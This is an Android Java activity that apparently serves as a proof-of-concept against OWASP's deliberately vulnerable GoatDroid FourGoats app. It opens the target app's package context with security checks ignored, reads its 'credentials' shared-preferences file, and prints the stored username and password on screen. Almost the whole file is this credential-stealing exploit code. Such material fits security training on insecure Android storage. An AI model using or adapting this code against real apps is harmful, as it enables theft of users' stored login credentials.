package com.example.sharedprefs;

import android.os.Bundle;
import android.app.Activity;
import android.content.Context;
import android.content.SharedPreferences;
import android.content.pm.PackageManager.NameNotFoundException;
import android.view.Menu;
import android.widget.TextView;

public class MainActivity extends Activity {

	@Override
	protected void onCreate(Bundle savedInstanceState) {
		super.onCreate(savedInstanceState);
		setContentView(R.layout.activity_main);
		
		TextView prefs_output = (TextView) findViewById(R.id.prefs_output);
		
		Context otherAppsContext = null;
		try{
			otherAppsContext = createPackageContext("org.owasp.goatdroid.fourgoats",Context.CONTEXT_IGNORE_SECURITY);
			
		}
		
		catch(NameNotFoundException e){
			
		}
		
		SharedPreferences fourgoats_prefs = otherAppsContext.getSharedPreferences("credentials",0);
		
		String results_username = fourgoats_prefs.getString("username", "not found");
		String results_password = fourgoats_prefs.getString("password", "not found");
		
		prefs_output.setText("Username found: "+results_username+"\n Password found: "+results_password);
		
		
	}

	@Override
	public boolean onCreateOptionsMenu(Menu menu) {
		// Inflate the menu; this adds items to the action bar if it is present.
		getMenuInflater().inflate(R.menu.main, menu);
		return true;
	}

}
